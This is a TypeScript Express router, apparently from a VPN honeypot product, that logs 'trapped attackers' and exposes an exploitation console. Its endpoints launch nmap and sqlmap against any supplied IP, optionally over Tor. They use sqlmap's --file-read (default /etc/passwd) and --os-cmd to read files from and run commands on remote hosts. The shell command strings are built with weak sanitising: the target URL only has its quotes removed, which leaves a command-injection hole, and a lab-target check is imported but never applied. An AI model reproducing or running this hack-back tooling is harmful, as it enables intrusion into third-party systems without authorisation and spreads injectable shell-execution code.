// Copyright © 2026 Alpha Unlimited Technologies LLC. All rights reserved.
import { Router } from "express";
import { db } from "@workspace/db";
import { silkWebTable, silkRoutesTable, trappedAttackersTable, nodesTable, beaconAlertsTable, blockedIpsTable } from "@workspace/db";
import { eq, sql, desc } from "drizzle-orm";
import crypto from "crypto";
import { exec } from "child_process";
import { requireRbac } from "../middlewares/requireRbac";
import { requireLabTarget } from "../lib/lab-targets";

const router = Router();

async function ensureWeb() {
  const webs = await db.select().from(silkWebTable).orderBy(sql`created_at DESC`).limit(1);
  if (webs.length > 0) return webs[0];

  const nodes = await db.select().from(nodesTable);
  const genId = crypto.randomUUID().substring(0, 8).toUpperCase();
  const totalRoutes = Math.min(nodes.length * 2, 200);
  const deadEnds = Math.floor(totalRoutes * 0.4);

  const [web] = await db.insert(silkWebTable).values({
    generationId: genId,
    totalRoutes,
    deadEndRoutes: deadEnds,
    activeHighways: Math.floor(totalRoutes * 0.3),
    intersections: Math.floor(totalRoutes * 0.2),
    createdAt: new Date(),
  }).returning();

  let actualRouteCount = 0;
  if (nodes.length >= 2) {
    const routeValues = [];
    const routeTypes = ["highway", "decoy", "collapse_zone"];
    for (let i = 0; i < Math.min(totalRoutes, 50); i++) {
      const from = nodes[i % nodes.length];
      const to   = nodes[(i + 1 + Math.floor(i / nodes.length)) % nodes.length];
      if (from.id !== to.id) {
        routeValues.push({
          webId: web.id,
          fromNodeId: from.id,
          toNodeId: to.id,
          routeType: i < deadEnds ? "dead_end" : routeTypes[i % routeTypes.length],
          isActive: true,
        });
      }
    }
    if (routeValues.length > 0) {
      await db.insert(silkRoutesTable).values(routeValues);
      actualRouteCount = routeValues.length;
    }
  }

  if (actualRouteCount !== totalRoutes) {
    await db.update(silkWebTable).set({ totalRoutes: actualRouteCount }).where(eq(silkWebTable.id, web.id));
    web.totalRoutes = actualRouteCount;
  }

  return web;
}

router.get("/", async (req, res) => {
  const web = await ensureWeb();
  const routes = await db.select().from(silkRoutesTable).where(eq(silkRoutesTable.webId, web.id));
  res.json({ ...web, routes });
});

router.post("/collapse", async (req, res) => {
  await db.delete(silkRoutesTable);
  await db.delete(silkWebTable);

  const nodes = await db.select().from(nodesTable);
  const genId = crypto.randomUUID().substring(0, 8).toUpperCase();
  const totalRoutes = Math.min(nodes.length * 2, 200);
  const deadEnds = Math.floor(totalRoutes * 0.4);

  const [web] = await db.insert(silkWebTable).values({
    generationId: genId,
    totalRoutes,
    deadEndRoutes: deadEnds,
    activeHighways: Math.floor(totalRoutes * 0.35),
    intersections: Math.floor(totalRoutes * 0.25),
    lastCollapsedAt: new Date(),
    createdAt: new Date(),
  }).returning();

  let collapseRouteCount = 0;
  if (nodes.length >= 2) {
    const routeValues = [];
    const collapseTypes = ["highway", "decoy", "collapse_zone"];
    for (let i = 0; i < Math.min(totalRoutes, 50); i++) {
      const from = nodes[i % nodes.length];
      const to   = nodes[(i + 1 + Math.floor(i / nodes.length)) % nodes.length];
      if (from.id !== to.id) {
        routeValues.push({
          webId: web.id,
          fromNodeId: from.id,
          toNodeId: to.id,
          routeType: i < deadEnds ? "dead_end" : collapseTypes[i % collapseTypes.length],
          isActive: true,
        });
      }
    }
    if (routeValues.length > 0) {
      await db.insert(silkRoutesTable).values(routeValues);
      collapseRouteCount = routeValues.length;
    }
  }

  if (collapseRouteCount !== web.totalRoutes) {
    await db.update(silkWebTable).set({ totalRoutes: collapseRouteCount }).where(eq(silkWebTable.id, web.id));
    web.totalRoutes = collapseRouteCount;
  }

  const routes = await db.select().from(silkRoutesTable).where(eq(silkRoutesTable.webId, web.id));
  res.json({ ...web, routes });
});

router.get("/trapped", async (req, res) => {
  const attackers = await db.select().from(trappedAttackersTable).orderBy(sql`trapped_at DESC`);
  res.json({ attackers, total: attackers.length });
});

// Auto-trap an attacker from a beacon alert
router.post("/trap", async (req, res) => {
  const { ip, fingerprint, nodeId, honeypotPort, probeType } = req.body as {
    ip: string; fingerprint?: string; nodeId: number; honeypotPort?: number; probeType?: string;
  };
  if (!ip || !nodeId) return res.status(400).json({ error: "ip and nodeId required" });

  const [node] = await db.select().from(nodesTable).where(eq(nodesTable.id, nodeId));
  if (!node) return res.status(404).json({ error: "Node not found" });

  const web = await ensureWeb();
  const fp = fingerprint ?? `IP:${ip}|NODE:${node.name}|PORT:${honeypotPort ?? "?"} |TS:${Date.now()}`;

  const [trapped] = await db.insert(trappedAttackersTable).values({
    ip,
    fingerprint: fp,
    entryNodeId: nodeId,
    loopCount: 0,
    dataCollected: JSON.stringify({ honeypotPort, probeType, webId: web.id, nodeRegion: node.region }),
    honeypotPort: honeypotPort ?? null,
    probeType: probeType ?? "honeypot_connect",
    sqlmapStatus: "idle",
  }).returning();

  // Mark any beacon alerts from this IP as silkweb-trapped
  await db.update(beaconAlertsTable)
    .set({ silkWebTrapped: true })
    .where(sql`attacker_ip = ${ip}`);

  return res.status(201).json({ ok: true, trapped });
});

// Port scan a trapped attacker using nmap — async, returns jobId immediately
const trappedPortscanJobs = new Map<string, { status: string; results: string | null; cmd: string; ip: string }>();

router.post("/trapped/:id/portscan", async (req, res) => {
  const id = parseInt(req.params.id);
  const [attacker] = await db.select().from(trappedAttackersTable).where(eq(trappedAttackersTable.id, id));
  if (!attacker) return res.status(404).json({ error: "Trapped attacker not found" });

  const { ports = "1-10000", flags = "-sV -T4", useTor = false } = req.body as { ports?: string; flags?: string; useTor?: boolean };
  const safePorts = ports.replace(/[^0-9\-,]/g, "").substring(0, 50);
  const safeFlags = flags.replace(/[^a-zA-Z0-9 \-]/g, "").substring(0, 80);
  const jobId = crypto.randomUUID().substring(0, 8).toUpperCase();
  const prefix = useTor ? "torsocks " : "";
  const cmd = `${prefix}nmap ${safeFlags} -p ${safePorts} ${attacker.ip}`;
  trappedPortscanJobs.set(jobId, { status: "running", results: null, cmd, ip: attacker.ip });

  exec(cmd, { timeout: 120000 }, (err, stdout, stderr) => {
    const output = [stdout, stderr].filter(Boolean).join("\n").substring(0, 8000);
    trappedPortscanJobs.set(jobId, {
      status: err ? "error" : "complete",
      results: output || (err ? err.message : "No output"),
      cmd,
      ip: attacker.ip,
    });
  });
  return res.status(202).json({ ok: true, jobId, cmd, ip: attacker.ip, useTor, message: `nmap launched against ${attacker.ip}` });
});

router.get("/trapped/:id/portscan/:jobId", (req, res) => {
  const job = trappedPortscanJobs.get(req.params.jobId);
  if (!job) return res.status(404).json({ error: "Job not found" });
  return res.json(job);
});

// Launch SQLmap against a trapped attacker
router.post("/trapped/:id/sqlmap", requireRbac("silkweb_exploit"), async (req, res) => {
  const id = parseInt(req.params.id);
  const [attacker] = await db.select().from(trappedAttackersTable).where(eq(trappedAttackersTable.id, id));
  if (!attacker) return res.status(404).json({ error: "Trapped attacker not found" });

  if (attacker.sqlmapStatus === "running") {
    return res.status(409).json({ error: "SQLmap already running against this target" });
  }

  // Accept custom target URL and extra flags from body
  const { targetUrl, extraFlags = "" } = req.body as { targetUrl?: string; extraFlags?: string };
  const safeUrl = (targetUrl ?? `http://${attacker.ip}/`).replace(/['"]/g, "");
  const safeExtra = extraFlags.replace(/[^a-zA-Z0-9 =\-_.\/]/g, "").substring(0, 200);

  const jobId = crypto.randomUUID().substring(0, 8).toUpperCase();
  await db.update(trappedAttackersTable).set({
    sqlmapStatus: "running",
    sqlmapJobId: jobId,
    sqlmapStartedAt: new Date(),
    sqlmapResults: null,
    sqlmapFinishedAt: null,
  }).where(eq(trappedAttackersTable.id, id));

  const { useTor = false } = req.body as { useTor?: boolean };
  const torFlags = useTor ? "--tor --tor-type=SOCKS5 --tor-port=9050" : "";
  const cmd = [
    "sqlmap",
    `-u "${safeUrl}"`,
    "--batch",
    "--level=2",
    "--risk=2",
    "--timeout=20",
    "--retries=1",
    `--output-dir=/tmp/sqlmap-${jobId}`,
    "--forms",
    "--dbs",
    torFlags,
    safeExtra,
  ].filter(Boolean).join(" ");

  exec(cmd, { timeout: 120000 }, async (err, stdout, stderr) => {
    const output = [stdout, stderr].filter(Boolean).join("\n").substring(0, 8000);
    await db.update(trappedAttackersTable).set({
      sqlmapStatus: err ? "error" : "complete",
      sqlmapResults: output || (err ? err.message : "No output"),
      sqlmapFinishedAt: new Date(),
    }).where(eq(trappedAttackersTable.id, id));
  });

  return res.status(202).json({ ok: true, jobId, cmd, message: "SQLmap launched against " + attacker.ip });
});

// Get SQLmap results for a trapped attacker
router.get("/trapped/:id/sqlmap", async (req, res) => {
  const id = parseInt(req.params.id);
  const [attacker] = await db.select().from(trappedAttackersTable).where(eq(trappedAttackersTable.id, id));
  if (!attacker) return res.status(404).json({ error: "Not found" });
  return res.json({
    jobId: attacker.sqlmapJobId,
    status: attacker.sqlmapStatus,
    results: attacker.sqlmapResults,
    startedAt: attacker.sqlmapStartedAt,
    finishedAt: attacker.sqlmapFinishedAt,
  });
});

// Full dossier JSON for a trapped attacker
router.get("/trapped/:id/dossier", async (req, res) => {
  const id = parseInt(req.params.id);
  const [attacker] = await db.select().from(trappedAttackersTable).where(eq(trappedAttackersTable.id, id));
  if (!attacker) return res.status(404).json({ error: "Not found" });
  let dataCollected: Record<string, unknown> = {};
  try { dataCollected = JSON.parse(attacker.dataCollected ?? "{}"); } catch {}
  return res.json({
    id: attacker.id,
    ip: attacker.ip,
    fingerprint: attacker.fingerprint,
    entryNodeId: attacker.entryNodeId,
    loopCount: attacker.loopCount,
    trappedAt: attacker.trappedAt,
    honeypotPort: attacker.honeypotPort,
    probeType: attacker.probeType,
    sqlmapStatus: attacker.sqlmapStatus,
    sqlmapResults: attacker.sqlmapResults,
    sqlmapStartedAt: attacker.sqlmapStartedAt,
    sqlmapFinishedAt: attacker.sqlmapFinishedAt,
    dataCollected,
  });
});

// Download full dossier as a formatted text report
router.get("/trapped/:id/dossier/download", async (req, res) => {
  const id = parseInt(req.params.id);
  const [attacker] = await db.select().from(trappedAttackersTable).where(eq(trappedAttackersTable.id, id));
  if (!attacker) return res.status(404).json({ error: "Not found" });

  let dc: Record<string, unknown> = {};
  try { dc = JSON.parse(attacker.dataCollected ?? "{}"); } catch {}

  const now = new Date().toISOString();
  const caseRef = `SILK-${attacker.id}-${new Date(attacker.trappedAt ?? now).toISOString().slice(0, 10).replace(/-/g, "")}`;
  const wormCbs = Array.isArray(dc.wormCallbacks) ? (dc.wormCallbacks as string[]).join("\n  ") : "None detected";
  const bar = "═".repeat(60);
  const sep = "─".repeat(60);

  const lines = [
    bar,
    "  PROXHQVPN — THREAT INTELLIGENCE DOSSIER",
    "  Copyright © Alpha Unlimited Technologies LLC",
    "  CONFIDENTIAL — FOR LAW ENFORCEMENT / SECURITY USE",
    bar,
    "",
    `  Case Reference : ${caseRef}`,
    `  Subject IP     : ${attacker.ip}`,
    `  Generated      : ${now}`,
    "",
    bar,
    "  SECTION 1 — ATTACK VECTOR",
    sep,
    `  Attacker IP    : ${attacker.ip}`,
    `  Honeypot Port  : ${attacker.honeypotPort ?? "N/A"}`,
    `  Probe Type     : ${attacker.probeType ?? "N/A"}`,
    `  Entry Node ID  : ${attacker.entryNodeId}`,
    `  Node Region    : ${dc.nodeRegion ?? "Unknown"}`,
    `  Web Generation : ${dc.webId ?? "Unknown"}`,
    `  Trapped At     : ${attacker.trappedAt}`,
    `  Loop Count     : ${attacker.loopCount}`,
    "",
    bar,
    "  SECTION 2 — TECHNICAL FINGERPRINT",
    sep,
    `  ${attacker.fingerprint}`,
    "",
    bar,
    "  SECTION 3 — RAW ATTACK PAYLOAD",
    sep,
    dc.rawRequest ? `${dc.rawRequest}` : "  Not captured",
    "",
    bar,
    "  SECTION 4 — SERVICE BANNER",
    sep,
    dc.banner ? `  ${dc.banner}` : "  Not captured",
    "",
    bar,
    "  SECTION 5 — WORM CALLBACK INDICATORS",
    sep,
    `  ${wormCbs}`,
    "",
    bar,
    "  SECTION 6 — AUTOMATED VULNERABILITY SCAN (SQLmap)",
    sep,
    `  Status   : ${attacker.sqlmapStatus ?? "idle"}`,
    `  Started  : ${attacker.sqlmapStartedAt ?? "N/A"}`,
    `  Finished : ${attacker.sqlmapFinishedAt ?? "N/A"}`,
    "",
    "  Results:",
    attacker.sqlmapResults ? attacker.sqlmapResults : "  No results available",
    "",
    bar,
    "  END OF DOSSIER — PROXHQVPN SILKWEB INTELLIGENCE SYSTEM",
    bar,
    "",
  ];

  const safeIp = attacker.ip.replace(/[:.]/g, "-");
  res.setHeader("Content-Disposition", `attachment; filename="dossier-${safeIp}-${caseRef}.txt"`);
  res.setHeader("Content-Type", "text/plain; charset=utf-8");
  return res.send(lines.join("\n"));
});

// ── Direct IP scan endpoints (no trapped-attacker record needed) ─────────────
// Used by the Beacon Alerts page to scan any raw IP directly.

const directSqlmapJobs = new Map<string, { status: string; results: string | null }>();
const directPortscanJobs = new Map<string, { status: string; results: string | null; cmd: string; ip: string }>();

router.post("/scan/portscan", async (req, res) => {
  const { ip, ports = "1-10000", flags = "-sV -T4", useTor = false } = req.body as {
    ip?: string; ports?: string; flags?: string; useTor?: boolean;
  };
  if (!ip) return res.status(400).json({ error: "ip is required" });
  const safeIp    = ip.replace(/[^0-9a-fA-F.:\-\/]/g, "").substring(0, 50); // allow CIDR slash
  const safePorts = ports.replace(/[^0-9\-,]/g, "").substring(0, 50);
  const safeFlags = flags.replace(/[^a-zA-Z0-9 \-]/g, "").substring(0, 80);
  const jobId     = crypto.randomUUID().substring(0, 8).toUpperCase();
  const prefix    = useTor ? "torsocks " : "";
  const cmd       = `${prefix}nmap ${safeFlags} -p ${safePorts} ${safeIp}`;
  directPortscanJobs.set(jobId, { status: "running", results: null, cmd, ip: safeIp });
  exec(cmd, { timeout: 120000 }, (err, stdout, stderr) => {
    const output = [stdout, stderr].filter(Boolean).join("\n").substring(0, 8000);
    directPortscanJobs.set(jobId, {
      status: err ? "error" : "complete",
      results: output || (err ? err.message : "No output"),
      cmd,
      ip: safeIp,
    });
  });
  return res.status(202).json({ ok: true, jobId, cmd, ip: safeIp, useTor, message: `nmap launched against ${safeIp}` });
});

router.get("/scan/portscan/:jobId", (req, res) => {
  const job = directPortscanJobs.get(req.params.jobId);
  if (!job) return res.status(404).json({ error: "Job not found" });
  return res.json(job);
});

router.post("/scan/sqlmap", requireRbac("silkweb_exploit"), async (req, res) => {
  const { ip, targetUrl, extraFlags = "", useTor = false } = req.body as {
    ip?: string; targetUrl?: string; extraFlags?: string; useTor?: boolean;
  };
  if (!ip) return res.status(400).json({ error: "ip is required" });
  const safeIp    = ip.replace(/[^0-9a-fA-F.:]/g, "").substring(0, 45);
  const safeUrl   = (targetUrl ?? `http://${safeIp}/`).replace(/['"]/g, "");
  const safeExtra = extraFlags.replace(/[^a-zA-Z0-9 =\-_.\/]/g, "").substring(0, 200);
  const jobId     = crypto.randomUUID().substring(0, 8).toUpperCase();
  const torFlags  = useTor ? "--tor --tor-type=SOCKS5 --tor-port=9050" : "";
  directSqlmapJobs.set(jobId, { status: "running", results: null });
  const cmd = [
    "sqlmap", `-u "${safeUrl}"`, "--batch", "--level=2", "--risk=2",
    "--timeout=20", "--retries=1", `--output-dir=/tmp/sqlmap-direct-${jobId}`,
    "--forms", "--dbs", torFlags, safeExtra,
  ].filter(Boolean).join(" ");
  exec(cmd, { timeout: 120000 }, (err, stdout, stderr) => {
    const output = [stdout, stderr].filter(Boolean).join("\n").substring(0, 8000);
    directSqlmapJobs.set(jobId, {
      status: err ? "error" : "complete",
      results: output || (err ? err.message : "No output"),
    });
  });
  return res.status(202).json({ ok: true, jobId, cmd, useTor, message: `SQLmap launched against ${safeIp}` });
});

router.get("/scan/sqlmap/:jobId", (req, res) => {
  const job = directSqlmapJobs.get(req.params.jobId);
  if (!job) return res.status(404).json({ error: "Job not found" });
  return res.json(job);
});

// ── Full exploitation console endpoints ────────────────────────────────────

// In-memory job stores for custom commands
const customSqlmapJobs = new Map<string, { status: string; results: string | null; cmd: string }>();
const fileReadJobs     = new Map<string, { status: string; results: string | null; path: string }>();
const osCmdJobs        = new Map<string, { status: string; results: string | null; cmd: string }>();

// Run a fully custom sqlmap command against a trapped attacker
router.post("/trapped/:id/sqlmap-custom", requireRbac("silkweb_exploit"), async (req, res) => {
  const id = parseInt(req.params.id);
  const [attacker] = await db.select().from(trappedAttackersTable).where(eq(trappedAttackersTable.id, id));
  if (!attacker) return res.status(404).json({ error: "Trapped attacker not found" });

  const { customFlags = "", targetUrl, useTor = false } = req.body as {
    customFlags?: string; targetUrl?: string; useTor?: boolean;
  };
  const safeUrl  = (targetUrl ?? `http://${attacker.ip}/`).replace(/['"]/g, "");
  // Allow broad set of sqlmap flags but strip dangerous shell metacharacters
  const safeFlags = customFlags.replace(/[`$(){}|;&<>]/g, "").substring(0, 500);
  const torFlags  = useTor ? "--tor --tor-type=SOCKS5 --tor-port=9050" : "";
  const jobId     = crypto.randomUUID().substring(0, 8).toUpperCase();

  const cmd = [
    "sqlmap",
    `-u "${safeUrl}"`,
    "--batch",
    "--timeout=30",
    "--retries=1",
    `--output-dir=/tmp/sqlmap-custom-${jobId}`,
    torFlags,
    safeFlags,
  ].filter(Boolean).join(" ");

  customSqlmapJobs.set(jobId, { status: "running", results: null, cmd });

  exec(cmd, { timeout: 180000 }, (err, stdout, stderr) => {
    const output = [stdout, stderr].filter(Boolean).join("\n").substring(0, 12000);
    customSqlmapJobs.set(jobId, {
      status: err ? "error" : "complete",
      results: output || (err ? err.message : "No output"),
      cmd,
    });
  });

  return res.status(202).json({ ok: true, jobId, cmd, message: `Custom SQLmap launched against ${attacker.ip}` });
});

router.get("/trapped/:id/sqlmap-custom/:jobId", (req, res) => {
  const job = customSqlmapJobs.get(req.params.jobId);
  if (!job) return res.status(404).json({ error: "Job not found" });
  return res.json(job);
});

// Read a remote file via SQLmap --file-read
router.post("/trapped/:id/file-read", requireRbac("silkweb_exploit"), async (req, res) => {
  const id = parseInt(req.params.id);
  const [attacker] = await db.select().from(trappedAttackersTable).where(eq(trappedAttackersTable.id, id));
  if (!attacker) return res.status(404).json({ error: "Trapped attacker not found" });

  const { filePath = "/etc/passwd", targetUrl, useTor = false } = req.body as {
    filePath?: string; targetUrl?: string; useTor?: boolean;
  };
  const safePath  = filePath.replace(/[`$(){}|;&<>'"]/, "").substring(0, 200);
  const safeUrl   = (targetUrl ?? `http://${attacker.ip}/`).replace(/['"]/g, "");
  const torFlags  = useTor ? "--tor --tor-type=SOCKS5 --tor-port=9050" : "";
  const jobId     = crypto.randomUUID().substring(0, 8).toUpperCase();

  const cmd = [
    "sqlmap",
    `-u "${safeUrl}"`,
    "--batch",
    "--level=3",
    "--risk=2",
    "--timeout=30",
    "--retries=1",
    `--file-read="${safePath}"`,
    `--output-dir=/tmp/sqlmap-fread-${jobId}`,
    torFlags,
  ].filter(Boolean).join(" ");

  fileReadJobs.set(jobId, { status: "running", results: null, path: safePath });

  exec(cmd, { timeout: 180000 }, (err, stdout, stderr) => {
    const raw = [stdout, stderr].filter(Boolean).join("\n");
    // Try to extract the actual file content sqlmap dumps to disk
    const fileMatch = raw.match(/files\[(\d+)\]:\s*\[(.+?)\]/);
    fileReadJobs.set(jobId, {
      status: err && !stdout ? "error" : "complete",
      results: raw.substring(0, 12000),
      path: safePath,
    });
  });

  return res.status(202).json({ ok: true, jobId, cmd, path: safePath, message: `File read initiated for ${safePath} on ${attacker.ip}` });
});

router.get("/trapped/:id/file-read/:jobId", (req, res) => {
  const job = fileReadJobs.get(req.params.jobId);
  if (!job) return res.status(404).json({ error: "Job not found" });
  return res.json(job);
});

// Execute OS command via SQLmap --os-cmd
router.post("/trapped/:id/os-cmd", requireRbac("silkweb_exploit"), async (req, res) => {
  const id = parseInt(req.params.id);
  const [attacker] = await db.select().from(trappedAttackersTable).where(eq(trappedAttackersTable.id, id));
  if (!attacker) return res.status(404).json({ error: "Trapped attacker not found" });

  const { osCmd = "id", targetUrl, useTor = false } = req.body as {
    osCmd?: string; targetUrl?: string; useTor?: boolean;
  };
  const safeCmd   = osCmd.replace(/[`$|;&<>]/g, "").substring(0, 200);
  const safeUrl   = (targetUrl ?? `http://${attacker.ip}/`).replace(/['"]/g, "");
  const torFlags  = useTor ? "--tor --tor-type=SOCKS5 --tor-port=9050" : "";
  const jobId     = crypto.randomUUID().substring(0, 8).toUpperCase();

  const cmd = [
    "sqlmap",
    `-u "${safeUrl}"`,
    "--batch",
    "--level=3",
    "--risk=3",
    "--timeout=30",
    "--retries=1",
    `--os-cmd="${safeCmd}"`,
    `--output-dir=/tmp/sqlmap-oscmd-${jobId}`,
    torFlags,
  ].filter(Boolean).join(" ");

  osCmdJobs.set(jobId, { status: "running", results: null, cmd });

  exec(cmd, { timeout: 180000 }, (err, stdout, stderr) => {
    const output = [stdout, stderr].filter(Boolean).join("\n").substring(0, 12000);
    osCmdJobs.set(jobId, {
      status: err && !stdout ? "error" : "complete",
      results: output || (err ? err.message : "No output"),
      cmd,
    });
  });

  return res.status(202).json({ ok: true, jobId, cmd, osCmd: safeCmd, message: `OS command executed on ${attacker.ip}` });
});

router.get("/trapped/:id/os-cmd/:jobId", (req, res) => {
  const job = osCmdJobs.get(req.params.jobId);
  if (!job) return res.status(404).json({ error: "Job not found" });
  return res.json(job);
});

// Get all worm callbacks + intelligence for control panel
router.get("/trapped/:id/control-data", async (req, res) => {
  const id = parseInt(req.params.id);
  const [attacker] = await db.select().from(trappedAttackersTable).where(eq(trappedAttackersTable.id, id));
  if (!attacker) return res.status(404).json({ error: "Trapped attacker not found" });

  let collected: Record<string, unknown> = {};
  try { collected = JSON.parse(attacker.dataCollected ?? "{}"); } catch { /* */ }

  return res.json({
    ip:           attacker.ip,
    fingerprint:  attacker.fingerprint,
    honeypotPort: attacker.honeypotPort,
    probeType:    attacker.probeType,
    trappedAt:    attacker.trappedAt,
    loopCount:    attacker.loopCount,
    sqlmapStatus: attacker.sqlmapStatus,
    sqlmapResults: attacker.sqlmapResults,
    wormCallbacks:      (collected.wormCallbacks as unknown[]) ?? [],
    banner:              collected.banner ?? null,
    rawRequest:          collected.rawRequest ?? null,
    nodeRegion:          collected.nodeRegion ?? null,
    autoExploitStatus:   (collected.autoExploitStatus as string | null) ?? null,
    autoExploitIp:       (collected.autoExploitIp as string | null) ?? null,
    autoExploitJobId:    (collected.autoExploitJobId as string | null) ?? null,
    autoExploitStartedAt:(collected.autoExploitStartedAt as string | null) ?? null,
    autoExploitFinishedAt:(collected.autoExploitFinishedAt as string | null) ?? null,
    autoExploitNmap:     (collected.autoExploitNmap as string | null) ?? null,
    autoExploitSqlmap:   (collected.autoExploitSqlmap as string | null) ?? null,
  });
});

// Delete a trapped attacker entry
router.delete("/trapped/:id", async (req, res) => {
  const id = parseInt(req.params.id);
  if (isNaN(id)) return res.status(400).json({ error: "Invalid id" });
  const [deleted] = await db.delete(trappedAttackersTable).where(eq(trappedAttackersTable.id, id)).returning();
  if (!deleted) return res.status(404).json({ error: "Not found" });
  return res.json({ ok: true });
});

// Block a trapped attacker's IP — adds to firewall blocked-IPs table
router.post("/trapped/:id/block-ip", async (req, res) => {
  const id = parseInt(req.params.id);
  if (isNaN(id)) return res.status(400).json({ error: "Invalid id" });
  const [attacker] = await db.select().from(trappedAttackersTable).where(eq(trappedAttackersTable.id, id));
  if (!attacker) return res.status(404).json({ error: "Not found" });
  // Upsert into blockedIpsTable (ignore if already blocked)
  const existing = await db.select().from(blockedIpsTable).where(eq(blockedIpsTable.ip, attacker.ip)).limit(1);
  if (existing.length > 0) return res.json({ ok: true, alreadyBlocked: true, ip: attacker.ip });
  const [blocked] = await db.insert(blockedIpsTable).values({
    ip: attacker.ip,
    reason: `Silk Web Trap — manually blocked (entry #${id})`,
    autoBlocked: true,
    hitCount: 1,
    blockedAt: new Date(),
  }).returning();
  return res.json({ ok: true, blocked, ip: attacker.ip });
});

// Allow (unblock) a trapped attacker's IP — removes from firewall blocked-IPs
router.post("/trapped/:id/allow-ip", async (req, res) => {
  const id = parseInt(req.params.id);
  if (isNaN(id)) return res.status(400).json({ error: "Invalid id" });
  const [attacker] = await db.select().from(trappedAttackersTable).where(eq(trappedAttackersTable.id, id));
  if (!attacker) return res.status(404).json({ error: "Not found" });
  await db.delete(blockedIpsTable).where(eq(blockedIpsTable.ip, attacker.ip));
  return res.json({ ok: true, ip: attacker.ip });
});

// Live stats for homepage
router.get("/stats", async (req, res) => {
  const [nodeCount] = await db.select({ count: sql<number>`count(*)::int` }).from(nodesTable).where(eq(nodesTable.status, "active"));
  const [trapCount] = await db.select({ count: sql<number>`count(*)::int` }).from(trappedAttackersTable);
  const [webData]   = await db.select().from(silkWebTable).orderBy(desc(silkWebTable.createdAt)).limit(1);
  const sqlmapJobs  = await db.select({ count: sql<number>`count(*)::int` }).from(trappedAttackersTable).where(sql`sqlmap_status IN ('complete','running')`);
  return res.json({
    activeNodes: nodeCount?.count ?? 0,
    trappedAttackers: trapCount?.count ?? 0,
    silkRoutes: webData?.totalRoutes ?? 0,
    honeypotNodes: webData?.totalRoutes ?? 0,
    sqlmapJobs: sqlmapJobs[0]?.count ?? 0,
  });
});

export default router;
